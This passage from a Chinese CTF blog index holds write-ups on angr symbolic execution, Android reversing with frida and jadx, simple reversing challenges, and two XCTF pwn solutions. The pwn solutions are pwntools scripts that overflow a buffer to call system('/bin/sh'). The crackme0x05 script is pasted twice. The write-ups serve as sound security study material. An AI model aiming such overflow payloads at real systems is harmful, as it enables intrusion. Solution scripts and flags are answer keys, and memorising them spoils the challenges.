flag{ClientSideLoginsAreEasy@flare-on.com}","link":"/2022/01/28/BUU-reverse/BUU-reverse/"},{"title":"angr的学习","text":"学习一下angr符号执行… 符号执行基本概念符号执行 （Symbolic Execution）是一种程序分析技术。其可以通过分析程序来得到让特定代码区域执行的输入。 使用符号执行分析一个程序时，该程序会使用符号值作为输入，而非一般执行程序时使用的具体值。在达到目标代码时，分析器可以得到相应的路径约束，然后通过约束求解器来得到可以触发目标代码的具体值。 符号执行技术是一种白盒的静态分析技术。即，分析程序可能的输入需要能够获取到目标源代码的支持。同时，它是静态的，因为并没有实际的执行程序本身，而是分析程序的执行路径。 详细移步看雪 python虚拟环境在windows和linux中我都装的是anaconda来配置python虚拟环境。建议搭配pycharm使用 常用命令： 1234567891011121314151617# 创建一个名为py38的python3.8版本的虚拟环境：conda create -n py38 python=3.8 # 启动环境conda activate py38# 查看已经安装的包pip list# 退出环境conda deactivate py38# 删除虚拟环境中的包conda remove --name py38 package_name# 删除环境 py38conda remove -n py38 --all 用pycharm使用虚拟环境或者自带环境来新建项目，只需要找到其Python的解释器即可 举例我用anconda创建了一个py27的虚拟环境，在anaconda3下的envs目录下就能找到py27虚拟环境目录，在py27目录下即可看到python.exe 在pycharm中创建py2.7虚拟环境 B站有很多关于anconda虚拟环境的教程，可以去看看~ 在kali中安装anconda的时候，遇到了两个问题 conda命令未显示的问题在大佬aep的帮助下，得知环境变量添加错误，一般网上都把path添加在~/.bash.rc中，而我的shell是zsh环境，所以应该把path添加在 ~/.zshrc中 打开终端自动进入conda环境 1vim .condarc 在文件中键入： 1auto_activate_base: false 各种例题来自《从0到1:CTFer的成长之路》 例题下载链接 defcamp_r100首先查看一下保护，没有开PIE 用ida分析，记录一下判断成功的地址：0x400844 失败的地址： 0x400855 官方脚本： 123456789101112131415161718192021import angrdef main(): # auto_load_libs=False,阻止angr自动载入并分析依赖的库函数 p = angr.Project(&quot;r100&quot;, auto_load_libs=False) simgr = p.factory.simulation_manager(p.factory.full_init_state()) # 需要寻找和需要规避的地址，传入的可以是数组 simgr.explore(find=0x400844, avoid=0x400855) # fund是一个表，found表示其中一条通往目标地址的路径,若找到，其类型为SimState，代表程序此时的一个状态 # POSIX(Portable Operating System Interface):各种输入数据，posix.dump(0)获取标准输入(标准输入的文件句柄号为0) return simgr.found[0].posix.dumps(0).strip(b'\\0\\n')def test(): assert main().startswith(b'Code_Talkers')if __name__ == '__main__': print(main()) 官方给出的脚本跑了3秒多 hook函数改进方法以下是nullbook书中给出的改进算法 12345678910111213141516171819202122232425262728293031323334353637383940414243import angrimport time# 继承angr.SimProcedure类，并重写其中的run方法# 通过验证函数的循环次数可以确定flag的长度为12,所以只需要让fgets函数传入12个字节的输入即可class my_fgets(angr.SimProcedure): # s是rdi寄存器指向的内存地址，用来存放输入数据 def run(self,s,num,f): simfd = self.state.posix.get_fd(0) # read_data，存放12个输入字符即可 data,real_size = simfd.read_data(12) self.state.memory.store(s,data) return 12def main(): # 阻止angr自动载入并分析依赖的库函数 p = angr.Project(&quot;r100&quot;,auto_load_libs=False) # hook printf函数，replace = True表示已经代替了之前的hook p.hook_symbol('printf',angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained'](),replace=True) # hook fgets函数 p.hook_symbol('fgets',my_fgets(),replace=True) # blank_state 手动指定程序开始地址 addr是main函数的地址 state = p.factory.blank_state(addr = 0x4007e8) simgr = p.factory.simulation_manager(state) simgr.explore(find=0x400844,avoid=0x400855) return simgr.found[0].posix.dumps(0).strip(b'\\0\\n') if __name__ == '__main__': time_start = time.time() print(main()) time_end = time.time() print(time_end - time_start) 改进后的方法只用了1秒多！！ baby-re（DEFCON 2016 quals） 用ida分析，题目中是调用了12次scanf函数，将其存入到一个整形数组中，最后进入CheckSolution函数，CheckSolution非常巨大…… 我们先来使用上一题种使用到的hook改进方法 12# 阻止angr自动载入并分析依赖的库函数p = angr.Project(&quot;./baby-re&quot;,auto_load_libs=False) hook scanf函数 1234567891011class my_scanf(angr.SimProcedure): # s是rdi寄存器指向的内存地址，用来存放输入数据 def run(self,fmt,des): simfd = self.state.posix.get_fd(0) # read_data，存放4个字节即可 data,real_size = simfd.read_data(4) self.state.memory.store(des,data) return 1p.hook_symbol('__isoc99_scanf', my_scanf(), replace=True) 遇到fflush和printf函数，就直接return 12p.hook_symbol('printf', angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained'](), replace=True)p.hook_symbol('fflush', angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained'](), replace=True) 确定起始地址为main函数地址 1state = p.factory.blank_state(addr = 0x4025E7) 确定寻找地址： 规避地址： 1simgr.explore(find=0x4028E9,avoid=0x402941) 完整代码： 123456789101112131415161718192021222324252627282930313233343536373839import angrimport timeclass my_scanf(angr.SimProcedure): # s是rdi寄存器指向的内存地址，用来存放输入数据 def run(self,fmt,des): simfd = self.state.posix.get_fd(0) # read_data，存放4个字节即可 data,real_size = simfd.read_data(4) self.state.memory.store(des,data) return 1def main(): # 阻止angr自动载入并分析依赖的库函数 p = angr.Project(&quot;./baby-re&quot;,auto_load_libs=False) state = p.factory.blank_state(addr = 0x4025E7) # 遇到printf函数和fflush函数，就直接return p.hook_symbol('printf', angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained'](), replace=True) p.hook_symbol('fflush', angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained'](), replace=True) p.hook_symbol('__isoc99_scanf', my_scanf(), replace=True) simgr = p.factory.simulation_manager(state) simgr.explore(find=0x4028E9,avoid=0x402941) return simgr.found[0].posix.dumps(0) if __name__ == '__main__': time_start = time.time() print(main()) time_end = time.time() print(time_end - time_start) 这种方法跑出来花了100多秒 如何改进？ 不运行时检查方法在代码中加入 1simgr.one_active.options.add(angr.options.LAZY_SOLVES) 速度提升是质的飞跃，只花了12秒！！ 能否再提升效率呢？ scanf函数无法简单推断输入长度，所以有时候需要用claripy函数手动构造收入 导入claripy包来求解完全可以把claripy当作z3来用，Claripy.BVS()可以直接创建符号变量，参数一为变量名，参数二为数据宽度（位数）， 我们可以查看官方的代码： 12345678# let's provide the exact variables received through the scanf so we don't have to worry about parsing stdin into a bunch of ints.flag_chars = [claripy.BVS('flag_%d' % i, 32) for i in range(13)]class my_scanf(angr.SimProcedure): def run(self, fmt, ptr): # pylint: disable=arguments-differ,unused-argument self.state.mem[ptr].dword = flag_chars[self.state.globals['scanf_count']] self.state.globals['scanf_count'] += 1proj.hook_symbol('__isoc99_scanf', my_scanf(), replace=True) 我们可以通过以上的方式来创建用户的输入 但是这样的方式，我们不能再通过Dump标准输入来获得正确的输入 看看官方文档是怎么处理的： 123# evaluate each of the flag chars against the constraints on the found state to construct the flagflag = ''.join(chr(sm.one_found.solver.eval(c)) for c in flag_chars)return flag 这边贴上官方代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243#!/usr/bin/env python2from __future__ import print_function# Authors: David Manouchehri &lt;manouchehri@protonmail.com&gt;# P1kachu &lt;p1kachu@lse.epita.fr&gt;# Audrey Dutcher &lt;audrey@rhelmot.io&gt;# DEFCON CTF Qualifier 2016# Challenge: baby-re# Write-up: http://hack.carleton.team/2016/05/21/defcon-ctf-qualifier-2016-baby-re/# Runtime: ~15 seconds (thanks lazy solves!)import angrimport claripydef main(): proj = angr.Project('./baby-re', auto_load_libs=False) # let's provide the exact variables received through the scanf so we don't have to worry about parsing stdin into a bunch of ints. flag_chars = [claripy.BVS('flag_%d' % i, 32) for i in range(13)] class my_scanf(angr.SimProcedure): def run(self, fmt, ptr): # pylint: disable=arguments-differ,unused-argument self.state.mem[ptr].dword = flag_chars[self.state.globals['scanf_count']] self.state.globals['scanf_count'] += 1 proj.hook_symbol('__isoc99_scanf', my_scanf(), replace=True) sm = proj.factory.simulation_manager() sm.one_active.options.add(angr.options.LAZY_SOLVES) sm.one_active.globals['scanf_count'] = 0 # search for just before the printf(&quot;%c%c...&quot;) # If we get to 0x402941, &quot;Wrong&quot; is going to be printed out, so definitely avoid that. sm.explore(find=0x4028E9, avoid=0x402941) # evaluate each of the flag chars against the constraints on the found state to construct the flag flag = ''.join(chr(sm.one_found.solver.eval(c)) for c in flag_chars) return flagdef test(): assert main() == 'Math is hard!'if __name__ == '__main__': print(main()) 惊呆我一整年，只用了9秒…… 正想如何开了pie保护会怎样，没想到这样的例题就来了 sakura(Hitcon 2017)在这一题中，开了pie保护 这个sub_850函数要把我的ida干翻了…… 放大sub_850函数流程图，下面有很多类似的结构，都是给rbp+var_1E49赋值0的操作，只要是这种操作，都需要去规避，那我们就需要在程序运行时，将这些地址都添加到一个列表中，所以需要用到idc对其进行提取。 sub_850函数开始地址： sub_850函数结束地址： shift+F2，开启idc，选择idapython，在其中键入： nullbook中是这样尝试的，但是我没有在idc库中找到NextHead()这个API 查看官方文档： 也就是用二进制方式读取数据，和nullbook中描述的类似 需要注意的是找到汇编指令的硬编码，用b’\\xc6\\x85\\xB7\\xE1\\xFF\\xFF\\x00’代替即可 1simgr.explore(find = (0x110CA+0x400000),avoid = avoids) 以下是总结nullbook和官方文档的脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env python2from __future__ import print_functionimport timeimport hashlibimport angrdef main(): e = open(&quot;./sakura&quot;,'rb').read() avoids = [] index = 0 while True: index = e.find(b'\\xc6\\x85\\xB7\\xE1\\xFF\\xFF\\x00',index+1) if index == -1: break addr = 0x400000 + index avoids.append(addr) avoids.append(0x110EC+0x400000) # 没有成功输出flag的位置 proj = angr.Project('./sakura') state = proj.factory.entry_state() simgr = proj.factory.simulation_manager(state) simgr.one_active.options.add(angr.options.LAZY_SOLVES) simgr.explore(find = (0x110CA+0x400000),avoid = avoids) found = simgr.one_found text = found.solver.eval(found.memory.load(0x612040,400), cast_to=bytes) h = hashlib.sha256(text) flag = 'hitcon{'+h.hexdigest()+'}' return flagif __name__ == '__main__': time_start = time.time() print(main()) time_end = time.time() print(time_end - time_start) 运行结果： 当然nullbook书中介绍了更好的hook方法，以及跳过读取flag的步骤，将输入直接存放在内存中 2020虎符 enc (pe文件/单个函数angr执行) 主要的函数就两个，sub_441050和sub_4412A0 可以通过特征码或者插件得知sub_441050这个函数是md5加密算法 （这边主要想学习一下angr的知识） 通过大佬的神之动调，我们得知传入的v11的值为794c87696d24d16e7b9e3dddad778c93 下面sub_4012A0很复杂，这边贴上大佬的代码(orz)，学一下从单个函数开始的angr执行 12345678910111213141516171819202122from angr import *from claripy import *flag=BVS('flag',8*16) #flag的长度16字节 BVS创造输入result=BVV(b'\\xae\\xed\\x13\\x5c\\xbd\\xd2\\xa1\\x74\\x9c\\x4c\\x5e\\x02\\xd3\\x28\\x9b\\x60',8*16) #创建变量disasm=BVV(b'794c87696d24d16e7b9e3dddad778c93',8*32) #创建变量p=Project('task.exe',auto_load_libs=False) #是否自动载入依赖的库p.hook(0x405128,SIM_PROCEDURES['libc']['malloc']()) #hook SIM_PROCEDURES['模块名']['库函数名']p.hook(0x4035e4,SIM_PROCEDURES['libc']['calloc']())st=p.factory.full_init_state(addr=0x40154d,add_options={ options.SYMBOLTC_WRITE_ADDRESSES,options.REGION_MAPPING,options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS}) #设置引擎st.memory.store(st.regs.ebp - 0x24, flag) #传入参数st.memory.store(st.regs.ebp - 0x54, disasm) #传入参数sim = p.factory.simgr(st) #模拟执行sim.explore(find=0x401558) #正确的位置f = sim.one_foundf.solver.add(f.memory.load(f.regs.ebp - 0x24, 16) == result) #添加约束条件print(f.solver.eval(flag, cast_to=bytes)) #打印输入#只模拟执行4012a0加密函数 是构造参数， 函数加密之后的结果就写入flag.txt.enc中了，所以我们用010查看 用claripy.BVV()函数来构造位向量值。一参是值，二参是位数 1result=BVV(b'\\xae\\xed\\x13\\x5c\\xbd\\xd2\\xa1\\x74\\x9c\\x4c\\x5e\\x02\\xd3\\x28\\x9b\\x60',8*16) 构造flag值，claripy.BVS()可以直接创建位向量符号，就像z3中的BitVec一样一参为变量名，二参为位数。由上面的步骤，可以知道flag是16个字节的长度 1flag=BVS('flag',8*16) hook一些没有帮助的函数 12p.hook(0x405128,SIM_PROCEDURES['libc']['malloc']()) #hook SIM_PROCEDURES['模块名']['库函数名']p.hook(0x4035e4,SIM_PROCEDURES['libc']['calloc']()) 创建工程 123st=p.factory.full_init_state(addr=0x40154d,add_options={ options.SYMBOLTC_WRITE_ADDRESSES,options.REGION_MAPPING,options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS}) #设置引擎 函数的参数传递，看ida就很清晰了 12st.memory.store(st.regs.ebp - 0x24, flag) #传入参数二st.memory.store(st.regs.ebp - 0x54, disasm) #传入参数一 模拟执行 1sim = p.factory.simgr(st) #模拟执行 确定寻找的地方（即下一条语句的开始点） 1sim.explore(find=0x401558) #正确的位置 为出路 f 添加约束条件，结果要与flag.txt.enc文件中的内容一致 12f = sim.one_foundf.solver.add(f.memory.load(f.regs.ebp - 0x24, 16) == result) ​ v11经过函数运算之后，值传递给了Buffer 输出flag 1print(f.solver.eval(flag, cast_to=bytes)) #打印输入 佩服，五体投地……(orz) CSCI-4968-MBEcrackme0x00a12345678910111213141516171819202122232425262728import angrimport timedef main(): congras=0x08048533 wrong=0x08048554 p = angr.Project(&quot;crackme0x00a&quot;, auto_load_libs=False) p.hook_symbol('printf', angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained'](), replace=True) state = p.factory.full_init_state() simgr = p.factory.simulation_manager(state) simgr.one_active.options.add(angr.options.LAZY_SOLVES) simgr.explore(find=congras, avoid=wrong) return simgr.found[0].posix.dumps(0).strip(b'\\0\\n')if __name__ == '__main__': time_start = time.time() print(main()) time_end = time.time() print(time_end - time_start)# b'g00dJ0B!# 1.2658519744873047 crackme0x01, crackme0x02,crackme0x03和以上类似 crackme0x04直接看crackme0x04，以下是流程图 两重判断，官方文档中使用的是控制流图CFG()函数，去寻找exit函数的地址，自动识别正确的地址 1FIND_ADDR = cfg.kb.functions.function(name=&quot;exit&quot;).addr 1234567891011121314151617181920212223242526import angrimport timedef main(): AVOID_ADDR = 0x080484fb p = angr.Project(&quot;crackme0x04&quot;, auto_load_libs=False) p.hook_symbol('_printf', angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained'](), replace=True) cfg = p.analyses.CFG() FIND_ADDR = cfg.kb.functions.function(name=&quot;exit&quot;).addr simgr = p.factory.simulation_manager() simgr.explore(find = FIND_ADDR,avoid = AVOID_ADDR) return simgr.found[0].posix.dumps(0)if __name__ == '__main__': time_start = time.time() print(main()) time_end = time.time() print(time_end - time_start) crackme0x05函数的意思，相当于三重判断 mian函数 check()函数 parell()函数 三重判断？看官方文档： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#!/usr/bin/env python2# -*- coding: utf-8 -*-# Author: David Manouchehri &lt;manouchehri@protonmail.com&gt;# Modern Binary Exploitation# http://security.cs.rpi.edu/courses/binexp-spring2015/import angrimport subprocessdef main(): proj = angr.Project('crackme0x05', load_options={&quot;auto_load_libs&quot;: False})#!/usr/bin/env python2# -*- coding: utf-8 -*-# Author: David Manouchehri &lt;manouchehri@protonmail.com&gt;# Modern Binary Exploitation# http://security.cs.rpi.edu/courses/binexp-spring2015/import angrimport subprocessdef main(): proj = angr.Project('crackme0x05', load_options={&quot;auto_load_libs&quot;: False}) def correct(state): try: return b'Password OK' in state.posix.dumps(1) except: return False def wrong(state): try: return b'Password Incorrect' in state.posix.dumps(1) except: return False sm = proj.factory.simulation_manager() sm.explore(find=correct, avoid=wrong) #print(sm.found[0].posix.dumps(1)) return sm.found[0].posix.dumps(0) # .lstrip('+0').rstrip('B')def test(): # it SHOULD just be two numbers but the way angr models scanf means that it could technically be any number of formats # so we gotta check against ground truth with open('input', 'wb') as fp: fp.write(main()) assert subprocess.check_output('./crackme0x05 &lt; input', shell=True) == b'IOLI Crackme Level 0x05\\nPassword: Password OK!\\n'if __name__ == '__main__': print(repr(main())) 这次官方文档给出的意思就是explore()函数中，传入的不是地址，也不是地址数组，而是函数 大概意思就是这个程序的输入是否存在目标字符串，贴上大佬的解释","link":"/2022/05/06/reverse/angr%E7%9A%84%E5%AD%A6%E4%B9%A0/"},{"title":"攻防世界_pwn新手练习区","text":"学习一下攻防世界pwn专题😂 level0 首先用checksec查看一下保护 是一个64位的程序，开了NX防护（堆栈不可执行） 这边有个system()函数 在这个函数中，buf分配了128个字节，但是read()函数中，我们却可以传入0x200个字节 rbp+8是read函数的返回地址 我们需要把rbp+8给覆盖掉，并且在后面添加callsystem函数的地址，这样就会执行callsystem，可以进行下一步的cat falg操作了…… 123456789101112131415161718192021from pwn import *#context(arch='amd64', os='linux', log_level='debug')file_name = &quot;./ke1os&quot;debug = 0if debug == 1: r = remote('111.200.241.244', 60230)else: r = process(file_name)elf = ELF(file_name)payload = b'a' *(0x80 + 8) + p64(0x00400596)print(payload)r.sendline(payload)r.interactive() 参考链接 level 2查看一下保护，没有开站保护，所以可以栈溢出 进入vulnerable_function()函数，可以看到buf的大小为0x88，但是读入的字符串大小为0x100，所以存在栈溢出漏洞是实锤了。 而且还发现有system（）函数，还缺一个”/bin/sh”来提权， 查看字符串，是否有可以利用的字符串 所以我们的思路就是： 填充字符串使buf溢出 溢出之后，把buf函数的地址改成system的返回地址， 字符串的地址：0x0804A024 system函数的地址：0x08048320 123456789101112131415161718192021222324from pwn import *# context(arch='i386', os='linux', log_level='debug')file_name = &quot;./ke1os&quot;debug = 1if debug == 1: r = remote('111.200.241.244', 54370)else: r = process(&quot;./ke1os&quot;)elf = ELF(file_name)sys_addr = 0x08048320binsh_addr = 0x0804A024payload = b'a'*(0x88+4) + p32(sys_addr) + p32(0x1111) + p32(binsh_addr)print(payload)r.sendline(payload)r.interactive() 分配的buff空间为0x88个字节，因为是32位程序，所以返回地址我们填入的是4个字节，所以是0x88+4个字节，然后下面的是system函数的地址，后面的地址是压入栈的返回地址，所以可以随便填写，因为会直接进行后面的提权，然后就是局部变量，binsh_addr的地址。 也就是在32位程序运行中，函数参数直接压入栈中 调用函数时栈的结构为：调用函数地址-&gt;函数返回地址-&gt;参数n-&gt;参数n-1-&gt;参数1 所以要在函数地址后面首先要去覆盖它的返回地址","link":"/2022/03/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn/"},{"title":"anroid的学习","text":"androad逆向啥时候能入个门… fridafrida的安装虚拟环境的安装建议在python虚拟环境中安装frida.关于conda虚拟环境，可以看我的另一篇博客 我将frida环境安装在了python3.8的名为py38虚拟环境中 frida的下载以下命令默认是安装最新版的frida。有了虚拟环境，就不会报错了，避免走了很多坑 123456//启动虚拟环境conda activate py38 //安装frida等pip install fridapip install frida-tools 连接模拟器adb连接模拟器本人使用的模拟器为夜神模拟器（不同模拟器使用的端口都是不一致的，可以自行百度) 在命令提示符界面中键入命令： 12adb connect 127.0.0.1:62001//adb disconnect 为取消链接 然后再输入命令： 1adb devices 使用以下命令查看模拟器cpu架构，先记一下，后面需要根据此来下载对应的frida-server 1getprop ro.product.cpu.abi frida-server的下载与使用参考博客 查看pip安装目录 1pip list 查看frida的版本 下载地址，选择firda对应版本以及模拟器的cpu架构下载。经过几次测试，发现适合本机模拟器的是以下的版本 我的frida-server文件再E:\\Anroid目录下，使用adb将frida-server文件push到模拟器的data/local/tmp目录下 1adb push E:\\Anroid\\frida-server-15.1.22-android-x86 data/local/tmp 123456789101112131415adb shellsucd data/local/tmpchmod 777 frida-server-15.1.22-android-x86//运行文件./frida-server-15.1.22-android-x86//如果运行失败，则需要更换版本//进行端口转发adb forward tcp:27042 tcp:27042adb forward tcp:27043 tcp:27043 //查看 Android 进程列表frida-ps -R 运行之后，在另一个窗口输入以下命令，进行端口转发 1adb forward tcp:27042 tcp:27042 frida的基本使用pass XCTF anroid 新手区刷题记录easyjavaapp1用jadx-gui查看 onClick中可以看到主要的对比函数，是异或运算 双击上面的APPLICATION_ID可以跳转到这里 1234567version_code = 15version_name = &quot;X&lt;cP[?PHNB&lt;P?aj&quot;flag = &quot;&quot;for i in range(len(version_name)): flag+=chr(version_code^ord(version_name[i]))print(flag)# W3l_T0_GAM3_0ne app2（说实话真不太熟悉java，代码审计的功底基本为0……orz） 可以看到这边有个SecondActivity函数 仔细阅读代码，此处应该是stringExtra和stringExtra2字符串经过连接，加密之后需要和左边的字符串相等，继续跟进 分析so文件loadLibrary()函数，载入外部的模块，有了之前的教训，可以知道so文件放在lib目录下 在cmd环境中使用apktool解包apk文件 1apktool d app2.apk 奇怪，lib目录下有三个文件夹，里面有三个同名的so文件…… 大同小异，我用ida反汇编第二个文件夹中的so文件，可以看到其中的加密函数 可以从函数名称中得知是AES加密，key是”thisisatestkey==” 通过神器cyberchef，可以解密出来（试了好久……） 以为账号试aimage，密码是tencent，就会弹出flag，是我太年轻了…… 再回jadx-gui中查看 这边也有和上面一样加密的字符串，cyberchef解密 服了……没想到解出来的就是flag，看来题目就没想过会弹出flag，有点反常规 app3题目就给出了一个.ab文件，使用010查看一下文件头 看雪大佬博客中说，这边是none，说明是没有加密的意思 转换ab文件这边使用的是github上的abe工具来将.ab文件转换成jar文件 下载之后，我将abe.jar和app3.ab放在了同一个文件夹中，运行以下命令： 1java -jar abe.jar unpack app3.ab app3.tar 解压之后可以看到文件中的apk文件，在模拟器中安装 在同目录下，还有一个db文件中，其中有个Demo.db文件 使用sqlitebrowser打开Demo.db文件 打开之后发现需要密码 用jadx-gui分析base.apk文件，貌似中间就是关键的加密函数了 说实话这边很绕，需要改类名和方法名 class1和class2的定义： 调用： “Stra1234”（”Stranger”字符串和”123456”各取前四位）md5加密之后，与字符串”Stra1234”和”yaphetshan”(注意方法class1_fun3)结合，也就是”Stra123444e2e4457d4e252ca5b9fe9d20b3fea5yaphetshan”进行SHA-1加密 下面是伪代码： 1sha1(&quot;Stra1234&quot; + md5(&quot;Stra1234&quot;) + &quot;yaphetshan&quot;)[0:7] “ae56f99” 当然也可以用python、java实现，Java我不是很熟悉，看的我一愣一愣的…… sqlitebrowser打开.db文件 打开后： 很奇怪，是不是我没有执行apk，没有进行下面的语句执行，所有flag没有生成？？ easy-dex这一题真的是见世面了…… hasCode = false ， name = Nativeactivity 看大佬博客说，入口点在so文件中的anroid_main函数中 可以看到程序的主逻辑了，当摇动手机到100次的时候，就会生成真正的dex文件，然后删除，我们需要根据它的加密方法，换源dex文件 先把off_43A18数据dump出来 1234567import idaapistart_address=0x7004data_length=0x3ca10data=idaapi.get_bytes(start_address, data_length)fp = open('dump', 'wb')fp.write(data)fp.close() dump出来，然后把加密形式用python实现，代码来源 123456789101112131415161718192021222324252627import zlibwith open('dump', 'rb') as f: data = list(f.read()) size = 0x3ca10 times = 0 while True: if times &lt;= 0x59: t = int(times / 10) if times % 10 == 9: s = int(size / 10) x = (t + 1) * s if s * t &lt; x: c = 0 for _ in range(s): data[s * t + c] = data[s * t + c] ^ times c += 1 if times == 0x59: while x &lt; size: data[x] = data[x] ^ 89 x += 1 break times += 1fbytes = bytes(data)with open('easydex.dex', 'wb') as f1: f1.write(zlib.decompress(fbytes)) 生成的easydex.dex文件用jadx-gui打开 在原apk文件中找到了two_fish字符，可以推断是two_fish加密了 1I have a male fish and a female fish. 网上的twofish加密是base64解密的,所以我们把easydex.dex中的数组先用base64加密一下 1234567import base64flag = [-120, 77, -14, -38, 17, 5, -42, 44, -32, 109, 85, 31, 24, -91, -112, -83, 64, -83, -128, 84, 5, -94, -98, -30, 18, 70, -26, 71, 5, -99, -62, -58, 117, 29, -44, 6, 112, -4, 81, 84, 9, 22, -51, 95, -34, 12, 47, 77]data = []for i in flag: data.append(i&amp;0xff)print(base64.b64encode(bytes(data)))# iE3y2hEF1izgbVUfGKWQrUCtgFQFop7iEkbmRwWdwsZ1HdQGcPxRVAkWzV/eDC9N qwb{TH3y_Io&lt;e_EACh_OTh3r_FOrEUER} 哪里easy啊…… ｡ﾟヽ(ﾟ´Д`)ﾉﾟ｡ easy-so用jadx-gui打开，发现加载了so文件，但是发现没有在jadx-gui中发现lib文件夹，把我一慌…… 好吧是我瞎了…… 还是用老套路,用apktool 1apktool d easy-so.apk 去lib文件夹下，然后用ida分析一下so文件： 在这边就很清晰了，上脚本： 1234567string = &quot;f72c5a36569418a20907b55be5bf95ad&quot;string1 = &quot;&quot;for i in range(0,len(string),2): string1 += string[i+1] string1 += string[i]print(string1[16:]+string1[:16])# 90705bb55efb59da7fc2a5636549812a flag{90705bb55efb59da7fc2a5636549812a} 基础anroid有点非预期解的感觉…… 用jadx-gui打开之后，发现有压缩包，然后貌似和jpg有关 apktool解包之后，找到这个压缩包，把后缀改成jpg，打开 我这个做法还是挺拉跨的，如果对齐进行了混淆，那就…… 看wp之后，发现了一般的做法： MainAcitvity中有个checkPassword，跟进函数 我用的是爆破： 12345678flag = &quot;&quot;for len in range(12): for t in range(128): if chr(255 - len - 100 - t) == '0' : flag += chr(t) breakprint(flag)# kjihgfedcba` 输入之后，发现还没有完…… 验证成功后就到了MainActivity2，发送了一个广播 接受广播器只有一个，接着会启动NextContent这个活动 跟进函数功能就是读取timg_2.zip的内容，然后输入到img.jpg中 androidminifest中有广播内容，也就是”android.is.very.fun” 出来了！！！ anroid 2.0用jadx-gui打开 还是熟悉的套路，用apktool解包apk之后，在lib文件加下，找到so文件 用ida分析 注意这边有坑点， i!=4，也就是i&lt;4，只对前4位进行了运算 查看Init（）函数，大概就是把15位的字符串，分成了三份 1234567891011121314151617181920212223242526v5 = []c5 = &quot;LN^dl&quot;for i in range(len(c5)-1): v5.append((ord(c5[i])^0x80)//2)v5.append(ord(c5[4]))# print(v5)c6 = [32, 53, 45, 22, 97]v6 = []for i in range(len(c6)-1): v6.append(c6[i]^ord(c5[i]))v6.append(c6[4])# print(v6)c7 = &quot;AFBo}&quot;v7 = []for i in range(len(c7)-1): v7.append(ord(c7[i])^c6[i])v7.append(ord(c7[4]))# print(v7)flag = &quot;&quot;for i in range(5): flag += chr(v5[i]) + chr(v6[i]) + chr(v7[i])print(flag) APK逆向题目的意思还是不难理解的，将字符串”Tenshine”md5加密之后，每两位取第一位字符 用cmd5网站加密的时候，看成下面的m5_middle了，纠结了挺久…… 123456789101112131415import hashlibstr = 'Tenshine'hl = hashlib.md5()hl.update(str.encode(encoding='utf-8'))print('&quot;%s&quot; MD5加密后为 ：'%str + hl.hexdigest())string = hl.hexdigest()for i in range(len(string)): if i%2 == 0: print(string[i],end = &quot;&quot;)# bc72f242a6af3857","link":"/2022/05/13/mobile/anroid%E7%9A%84%E5%AD%A6%E4%B9%A0/"},{"title":"攻防世界_re","text":"学习一下攻防世界reverse专题😀 logmein （动调） 动调出来右边的值就可以了 123flag = [0x52,0x43,0x33,0x2d,0x32,0x30,0x31,0x36,0x2d,0x58,0x4f,0x52,0x49,0x53,0x47,0x55,0x44]for i in flag: print(chr(i),end = &quot;&quot;) RC3-2016-XORISGUD insanity 9447{This_is_a_flag} python-trade在线pyc反汇编 123456789101112131415161718192021#!/usr/bin/env python# visit https://tool.lu/pyc/ for more informationimport base64def encode(message): s = '' for i in message: x = ord(i) ^ 32 x = x + 16 s += chr(x) return base64.b64encode(s)correct = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'flag = ''print 'Input flag:'flag = raw_input()if encode(flag) == correct: print 'correct'else: print 'wrong' 12345678import base64string = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'string2 = base64.b64decode(string)string2 = [int(hex(i),16) for i in string2]flag = &quot;&quot;for i in range(len(string2)): flag += chr((string2[i]-16) ^ 32)print(flag) nctf{d3c0mpil1n9_PyC} re （动调） 先查个壳，动调一下就出来了 DUTCTF{We1c0met0DUTCTF} game （动调）说一下思路，直接修改汇编，跳转到最后成功的函数中，然后动调出最后的v2数组（0x73是第二个值） 12345flag = [0x7a,0x73,0x63,0x74,0x66,0x7B,0x54,0x39,0x69,0x73,0x5f,0x74,0x4f,0x70,0x69,0x63,\\0x5f,0x31,0x73,0x5f,0x76,0x35,0x72,0x79,0x5f,0x69,0x6e,0x74,0x37,0x72,0x65,0x73,0x74,0x69,0x6e,0x67\\,0x5f,0x62,0x36,0x74,0x5f,0x6f,0x74,0x68,0x65,0x72,0x73,0x5f,0x61,0x72,0x65,0x5f,0x6e,0x30,0x74,0x7d]for i in flag: print(chr(i),end= &quot;&quot;) zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t} Hello,CTF题目的意思就是把flag，转成16进制数 123flag = [0x43,0x72,0x61,0x63,0x6b,0x4d,0x65,0x4a,0x75,0x73,0x74,0x46,0x6f,0x72,0x46,0x75,0x6e]for i in flag: print(chr(i),end = &quot;&quot;) 或者： 123from Crypto.Util.number import *f = 0x437261636b4d654a757374466f7246756eprint(long_to_bytes(f)) no-strings-attached（动调） 但是没有关系，我们不需要修补程序 我们跟进decrypt函数，查看汇编之后，我们去内存中查找[eax]，就能查看flag了 19447{you_are_an_international_mystery} csaw2013reversing2（动调）先用的ida调试，看一下整体布局，发现有一个反调试函数，跳过之后，发现flag旁边还有一块，没有运行过 直接运行右边的flag是这个样子 转到x32dbg，找到main函数入口点 这边有个int3，需要nop掉，不然执行不下去 nop掉跳转语句，messageA函数执行，但是没有结果 到这边还会跳转，我们继续nop掉跳转，让程序完整的执行代码 getit开始认真了，先查个壳 貌似是在/tmp目录下下一个flag.txt文件，然后还会把flag文件给删掉 在这边下个断点，一直f9 t字符串变成了harifCTF{b70c59275fcfa8aebf2d5911223c6589} 但是flag不对 看了好一会儿，才注意到，harif……前面还有一个0x53，麻了……选中他们，然后按a键转换成字符串。当然要是想好玩一点，也可以把下面的u，转换成t就行，flag的值就写道文本文档里了。 maze 放到ida64中查看 地图： 